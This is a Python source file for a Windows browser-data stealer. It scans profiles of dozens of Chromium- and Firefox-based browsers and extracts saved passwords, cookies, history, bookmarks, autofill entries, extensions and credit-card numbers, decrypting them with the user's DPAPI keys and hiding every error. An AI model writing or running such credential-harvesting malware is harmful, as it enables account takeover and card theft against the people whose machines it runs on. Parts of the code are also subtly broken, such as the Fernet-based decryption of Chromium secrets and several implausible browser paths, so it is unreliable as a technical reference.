import os
import sqlite3
import json
import base64
import shutil
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import win32crypt
import subprocess

class ExtendedBrowserCollector:
    def __init__(self):
        self.collected_data = {
            'passwords': {},
            'cookies': {},
            'history': {},
            'bookmarks': {},
            'autofill': {},
            'extensions': {},
            'sessions': {}
        }
        
        self.browsers = {
            'chromium_based': {
                'Chrome': os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
                'Chrome Beta': os.path.expanduser(r'~\AppData\Local\Google\Chrome Beta\User Data'),
                'Chrome Dev': os.path.expanduser(r'~\AppData\Local\Google\Chrome Dev\User Data'),
                'Chrome Canary': os.path.expanduser(r'~\AppData\Local\Google\Chrome SxS\User Data'),
                'Chromium': os.path.expanduser(r'~\AppData\Local\Chromium\User Data'),
                'Edge': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
                'Edge Beta': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge Beta\User Data'),
                'Edge Dev': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge Dev\User Data'),
                'Edge Canary': os.path.expanduser(r'~\AppData\Local\Microsoft\Edge SxS\User Data'),
                'Brave': os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
                'Brave Beta': os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser-Beta\User Data'),
                'Brave Nightly': os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser-Nightly\User Data'),
                'Opera': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Stable'),
                'Opera GX': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera GX Stable'),
                'Opera Beta': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Beta'),
                'Opera Developer': os.path.expanduser(r'~\AppData\Roaming\Opera Software\Opera Developer'),
                'Vivaldi': os.path.expanduser(r'~\AppData\Local\Vivaldi\User Data'),
                'Yandex': os.path.expanduser(r'~\AppData\Local\Yandex\YandexBrowser\User Data'),
                'Arc': os.path.expanduser(r'~\AppData\Local\Arc\User Data'),
                'Sidekick': os.path.expanduser(r'~\AppData\Local\Sidekick\User Data'),
                'SigmaOS': os.path.expanduser(r'~\AppData\Local\SigmaOS\User Data'),
                'Ghost Browser': os.path.expanduser(r'~\AppData\Local\Ghost Browser\User Data'),
                'Ungoogled Chromium': os.path.expanduser(r'~\AppData\Local\Ungoogled Chromium\User Data'),
                'Iridium': os.path.expanduser(r'~\AppData\Local\Iridium\User Data'),
                'Iron': os.path.expanduser(r'~\AppData\Local\ChromePlus\User Data'),
                'Slimjet': os.path.expanduser(r'~\AppData\Local\Slimjet\User Data'),
                'Comodo Dragon': os.path.expanduser(r'~\AppData\Local\Comodo\Dragon\User Data'),
                'CoolNovo': os.path.expanduser(r'~\AppData\Local\MapleStudio\ChromePlus\User Data'),
                'SlimBrowser': os.path.expanduser(r'~\AppData\Local\FlashPeak\SlimBrowser\User Data'),
                'Avant': os.path.expanduser(r'~\AppData\Local\Avant\User Data'),
                'Lunascape': os.path.expanduser(r'~\AppData\Local\Lunascape\User Data'),
                'GreenBrowser': os.path.expanduser(r'~\AppData\Local\GreenBrowser\User Data'),
                'TheWorld': os.path.expanduser(r'~\AppData\Local\TheWorld\User Data'),
                'Tango': os.path.expanduser(r'~\AppData\Local\Tango\User Data'),
                'RockMelt': os.path.expanduser(r'~\AppData\Local\RockMelt\User Data'),
                'Flock': os.path.expanduser(r'~\AppData\Local\Flock\User Data'),
                'Wyzo': os.path.expanduser(r'~\AppData\Local\Wyzo\User Data'),
                'Maxthon': os.path.expanduser(r'~\AppData\Local\Maxthon3\User Data'),
                'QQBrowser': os.path.expanduser(r'~\AppData\Local\Tencent\QQBrowser\User Data'),
                '360Chrome': os.path.expanduser(r'~\AppData\Local\360Chrome\Chrome\User Data'),
                'Sogou': os.path.expanduser(r'~\AppData\Local\Sogou\SogouExplorer\User Data'),
                'Liebao': os.path.expanduser(r'~\AppData\Local\liebao\User Data'),
                'CocCoc': os.path.expanduser(r'~\AppData\Local\CocCoc\Browser\User Data'),
                'SalamWeb': os.path.expanduser(r'~\AppData\Local\SalamWeb\User Data'),
                'Torch': os.path.expanduser(r'~\AppData\Local\Torch\User Data'),
                'Blisk': os.path.expanduser(r'~\AppData\Local\Blisk\User Data'),
                'Epic': os.path.expanduser(r'~\AppData\Local\Epic Privacy Browser\User Data'),
                'Uran': os.path.expanduser(r'~\AppData\Local\uCozMedia\Uran\User Data'),
                'Centaury': os.path.expanduser(r'~\AppData\Local\CentBrowser\User Data'),
                'Superbird': os.path.expanduser(r'~\AppData\Local\Superbird\User Data'),
                'Falkon': os.path.expanduser(r'~\AppData\Local\Falkon\User Data'),
                'Konqueror': os.path.expanduser(r'~\AppData\Local\Konqueror\User Data'),
                'Midori': os.path.expanduser(r'~\AppData\Local\Midori\User Data'),
                'Otter': os.path.expanduser(r'~\AppData\Local\Otter\User Data'),
                'K-Meleon': os.path.expanduser(r'~\AppData\Local\K-Meleon\User Data'),
                'Camino': os.path.expanduser(r'~\AppData\Local\Camino\User Data'),
                'Galeon': os.path.expanduser(r'~\AppData\Local\Galeon\User Data')
            },
            'firefox_based': {
                'Firefox': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles'),
                'Firefox ESR': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles'),
                'Firefox Beta': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles'),
                'Firefox Nightly': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles'),
                'Waterfox': os.path.expanduser(r'~\AppData\Roaming\Waterfox\Profiles'),
                'PaleMoon': os.path.expanduser(r'~\AppData\Roaming\Moonchild Productions\Pale Moon\Profiles'),
                'SeaMonkey': os.path.expanduser(r'~\AppData\Roaming\Mozilla\SeaMonkey\Profiles'),
                'IceCat': os.path.expanduser(r'~\AppData\Roaming\Mozilla\IceCat\Profiles'),
                'Cyberfox': os.path.expanduser(r'~\AppData\Roaming\8pecxstudios\Cyberfox\Profiles'),
                'TorBrowser': os.path.expanduser(r'~\Desktop\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default'),
                'LibreWolf': os.path.expanduser(r'~\AppData\Roaming\LibreWolf\Profiles'),
                'Floorp': os.path.expanduser(r'~\AppData\Roaming\Floorp\Profiles'),
                'Basilisk': os.path.expanduser(r'~\AppData\Roaming\Moonchild Productions\Basilisk\Profiles'),
                'IceWeasel': os.path.expanduser(r'~\AppData\Roaming\Mozilla\IceWeasel\Profiles'),
                'Swiftfox': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Swiftfox\Profiles'),
                'Swiftweasel': os.path.expanduser(r'~\AppData\Roaming\Mozilla\Swiftweasel\Profiles')
            },
            'webkit_based': {
                'Safari': os.path.expanduser(r'~\AppData\Local\Apple Computer\Safari'),
                'Epiphany': os.path.expanduser(r'~\AppData\Local\Epiphany'),
                'Gnome Web': os.path.expanduser(r'~\AppData\Local\Gnome\Web')
            },
            'other': {
                'Internet Explorer': os.path.expanduser(r'~\AppData\Local\Microsoft\Internet Explorer'),
                'SeaMonkey': os.path.expanduser(r'~\AppData\Roaming\Mozilla\SeaMonkey')
            }
        }
        
    def collect_all_browsers(self):
        for browser_type, browsers in self.browsers.items():
            for browser_name, browser_path in browsers.items():
                try:
                    if os.path.exists(browser_path):
                        self.collect_browser_data(browser_name, browser_path, browser_type)
                except Exception:
                    continue
        return self.collected_data
    
    def collect_browser_data(self, browser_name, browser_path, browser_type):
        try:
            if browser_type == 'chromium_based':
                self.collect_chromium_data(browser_name, browser_path)
            elif browser_type == 'firefox_based':
                self.collect_firefox_data(browser_name, browser_path)
            elif browser_type == 'webkit_based':
                self.collect_webkit_data(browser_name, browser_path)
            else:
                self.collect_other_browser_data(browser_name, browser_path)
        except Exception:
            pass
    
    def collect_chromium_data(self, browser_name, browser_path):
        try:
            profiles = self.get_chromium_profiles(browser_path)
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                
                login_data_path = os.path.join(profile_path, 'Login Data')
                if os.path.exists(login_data_path):
                    self.collect_chromium_passwords(browser_name, login_data_path, profile)
                
                cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
                if os.path.exists(cookies_path):
                    self.collect_chromium_cookies(browser_name, cookies_path, profile)
                
                history_path = os.path.join(profile_path, 'History')
                if os.path.exists(history_path):
                    self.collect_chromium_history(browser_name, history_path, profile)
                
                bookmarks_path = os.path.join(profile_path, 'Bookmarks')
                if os.path.exists(bookmarks_path):
                    self.collect_chromium_bookmarks(browser_name, bookmarks_path, profile)
                
                web_data_path = os.path.join(profile_path, 'Web Data')
                if os.path.exists(web_data_path):
                    self.collect_chromium_autofill(browser_name, web_data_path, profile)
                
                extensions_path = os.path.join(profile_path, 'Extensions')
                if os.path.exists(extensions_path):
                    self.collect_chromium_extensions(browser_name, extensions_path, profile)
        
        except Exception:
            pass
    
    def get_chromium_profiles(self, browser_path):
        profiles = ['Default']
        try:
            for item in os.listdir(browser_path):
                if item.startswith('Profile ') or item == 'Default':
                    profiles.append(item)
        except Exception:
            pass
        return list(set(profiles))
    
    def collect_chromium_passwords(self, browser_name, login_data_path, profile):
        try:
            temp_db = login_data_path + '.tmp'
            shutil.copy2(login_data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            passwords = []
            for row in cursor.fetchall():
                try:
                    url, username, encrypted_password = row
                    if encrypted_password:
                        password = self.decrypt_chromium_password(encrypted_password)
                        if password:
                            passwords.append({
                                'url': url,
                                'username': username,
                                'password': password
                            })
                except Exception:
                    continue
            
            if browser_name not in self.collected_data['passwords']:
                self.collected_data['passwords'][browser_name] = {}
            self.collected_data['passwords'][browser_name][profile] = passwords
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_chromium_cookies(self, browser_name, cookies_path, profile):
        try:
            temp_db = cookies_path + '.tmp'
            shutil.copy2(cookies_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
            
            cookies = []
            for row in cursor.fetchall():
                try:
                    host, name, value, encrypted_value = row
                    if encrypted_value:
                        decrypted_value = self.decrypt_chromium_cookie(encrypted_value)
                        value = decrypted_value if decrypted_value else value
                    
                    if value:
                        cookies.append({
                            'host': host,
                            'name': name,
                            'value': value
                        })
                except Exception:
                    continue
            
            if browser_name not in self.collected_data['cookies']:
                self.collected_data['cookies'][browser_name] = {}
            self.collected_data['cookies'][browser_name][profile] = cookies
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_chromium_history(self, browser_name, history_path, profile):
        try:
            temp_db = history_path + '.tmp'
            shutil.copy2(history_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            
            history = []
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit_time': last_visit_time
                })
            
            if browser_name not in self.collected_data['history']:
                self.collected_data['history'][browser_name] = {}
            self.collected_data['history'][browser_name][profile] = history
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_chromium_bookmarks(self, browser_name, bookmarks_path, profile):
        try:
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            bookmarks = []
            self.extract_bookmarks(bookmarks_data.get('roots', {}), bookmarks)
            
            if browser_name not in self.collected_data['bookmarks']:
                self.collected_data['bookmarks'][browser_name] = {}
            self.collected_data['bookmarks'][browser_name][profile] = bookmarks
            
        except Exception:
            pass
    
    def extract_bookmarks(self, node, bookmarks):
        if isinstance(node, dict):
            if node.get('type') == 'url':
                bookmarks.append({
                    'name': node.get('name', ''),
                    'url': node.get('url', '')
                })
            elif 'children' in node:
                for child in node['children']:
                    self.extract_bookmarks(child, bookmarks)
        
        for key, value in node.items():
            if isinstance(value, dict):
                self.extract_bookmarks(value, bookmarks)
    
    def collect_chromium_autofill(self, browser_name, web_data_path, profile):
        try:
            temp_db = web_data_path + '.tmp'
            shutil.copy2(web_data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name, value FROM autofill")
            
            autofill = []
            for row in cursor.fetchall():
                name, value = row
                autofill.append({
                    'name': name,
                    'value': value
                })
            
            cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
            
            credit_cards = []
            for row in cursor.fetchall():
                name, encrypted_number, exp_month, exp_year = row
                try:
                    card_number = self.decrypt_chromium_password(encrypted_number)
                    credit_cards.append({
                        'name': name,
                        'number': card_number,
                        'exp_month': exp_month,
                        'exp_year': exp_year
                    })
                except Exception:
                    continue
            
            if browser_name not in self.collected_data['autofill']:
                self.collected_data['autofill'][browser_name] = {}
            self.collected_data['autofill'][browser_name][profile] = {
                'forms': autofill,
                'credit_cards': credit_cards
            }
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_chromium_extensions(self, browser_name, extensions_path, profile):
        try:
            extensions = []
            
            for ext_id in os.listdir(extensions_path):
                ext_path = os.path.join(extensions_path, ext_id)
                if os.path.isdir(ext_path):
                    manifest_path = os.path.join(ext_path, 'manifest.json')
                    if os.path.exists(manifest_path):
                        try:
                            with open(manifest_path, 'r', encoding='utf-8') as f:
                                manifest = json.load(f)
                            
                            extensions.append({
                                'id': ext_id,
                                'name': manifest.get('name', ''),
                                'version': manifest.get('version', ''),
                                'description': manifest.get('description', '')
                            })
                        except Exception:
                            continue
            
            if browser_name not in self.collected_data['extensions']:
                self.collected_data['extensions'][browser_name] = {}
            self.collected_data['extensions'][browser_name][profile] = extensions
            
        except Exception:
            pass
    
    def collect_firefox_data(self, browser_name, browser_path):
        try:
            if not os.path.exists(browser_path):
                return
            
            profiles = []
            if os.path.isdir(browser_path):
                for item in os.listdir(browser_path):
                    profile_path = os.path.join(browser_path, item)
                    if os.path.isdir(profile_path):
                        profiles.append((item, profile_path))
            else:
                profiles.append(('default', browser_path))
            
            for profile_name, profile_path in profiles:
                self.collect_firefox_profile_data(browser_name, profile_name, profile_path)
                
        except Exception:
            pass
    
    def collect_firefox_profile_data(self, browser_name, profile_name, profile_path):
        try:
            logins_path = os.path.join(profile_path, 'logins.json')
            if os.path.exists(logins_path):
                self.collect_firefox_passwords(browser_name, logins_path, profile_name)
            
            cookies_path = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_path):
                self.collect_firefox_cookies(browser_name, cookies_path, profile_name)
            
            places_path = os.path.join(profile_path, 'places.sqlite')
            if os.path.exists(places_path):
                self.collect_firefox_history(browser_name, places_path, profile_name)
                self.collect_firefox_bookmarks(browser_name, places_path, profile_name)
            
            formhistory_path = os.path.join(profile_path, 'formhistory.sqlite')
            if os.path.exists(formhistory_path):
                self.collect_firefox_autofill(browser_name, formhistory_path, profile_name)
        
        except Exception:
            pass
    
    def collect_firefox_passwords(self, browser_name, logins_path, profile_name):
        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
            
            passwords = []
            for login in logins_data.get('logins', []):
                try:
                    hostname = login.get('hostname', '')
                    username = login.get('encryptedUsername', '')
                    password = login.get('encryptedPassword', '')
                    
                    passwords.append({
                        'url': hostname,
                        'username': username,
                        'password': password
                    })
                except Exception:
                    continue
            
            if browser_name not in self.collected_data['passwords']:
                self.collected_data['passwords'][browser_name] = {}
            self.collected_data['passwords'][browser_name][profile_name] = passwords
            
        except Exception:
            pass
    
    def collect_firefox_cookies(self, browser_name, cookies_path, profile_name):
        try:
            temp_db = cookies_path + '.tmp'
            shutil.copy2(cookies_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host, name, value FROM moz_cookies")
            
            cookies = []
            for row in cursor.fetchall():
                host, name, value = row
                cookies.append({
                    'host': host,
                    'name': name,
                    'value': value
                })
            
            if browser_name not in self.collected_data['cookies']:
                self.collected_data['cookies'][browser_name] = {}
            self.collected_data['cookies'][browser_name][profile_name] = cookies
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_firefox_history(self, browser_name, places_path, profile_name):
        try:
            temp_db = places_path + '.tmp'
            shutil.copy2(places_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT p.url, p.title, p.visit_count, p.last_visit_date
                FROM moz_places p
                WHERE p.visit_count > 0
                ORDER BY p.last_visit_date DESC
                LIMIT 1000
            """)
            
            history = []
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit_date': last_visit_date
                })
            
            if browser_name not in self.collected_data['history']:
                self.collected_data['history'][browser_name] = {}
            self.collected_data['history'][browser_name][profile_name] = history
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_firefox_bookmarks(self, browser_name, places_path, profile_name):
        try:
            temp_db = places_path + '.tmp'
            shutil.copy2(places_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT p.url, p.title
                FROM moz_bookmarks b
                JOIN moz_places p ON b.fk = p.id
                WHERE p.url IS NOT NULL
            """)
            
            bookmarks = []
            for row in cursor.fetchall():
                url, title = row
                bookmarks.append({
                    'url': url,
                    'name': title
                })
            
            if browser_name not in self.collected_data['bookmarks']:
                self.collected_data['bookmarks'][browser_name] = {}
            self.collected_data['bookmarks'][browser_name][profile_name] = bookmarks
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_firefox_autofill(self, browser_name, formhistory_path, profile_name):
        try:
            temp_db = formhistory_path + '.tmp'
            shutil.copy2(formhistory_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT fieldname, value FROM moz_formhistory")
            
            autofill = []
            for row in cursor.fetchall():
                fieldname, value = row
                autofill.append({
                    'name': fieldname,
                    'value': value
                })
            
            if browser_name not in self.collected_data['autofill']:
                self.collected_data['autofill'][browser_name] = {}
            self.collected_data['autofill'][browser_name][profile_name] = {'forms': autofill}
            
            conn.close()
            os.remove(temp_db)
            
        except Exception:
            pass
    
    def collect_webkit_data(self, browser_name, browser_path):
        pass
    
    def collect_other_browser_data(self, browser_name, browser_path):
        pass
    
    def decrypt_chromium_password(self, encrypted_password):
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                return self.decrypt_chromium_v10(encrypted_password)
            else:
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return None
    
    def decrypt_chromium_v10(self, encrypted_password):
        try:
            local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            
            cipher = Fernet(base64.urlsafe_b64encode(key))
            return cipher.decrypt(base64.urlsafe_b64encode(iv + payload)).decode('utf-8')
            
        except Exception:
            return None
    
    def decrypt_chromium_cookie(self, encrypted_value):
        return self.decrypt_chromium_password(encrypted_value)
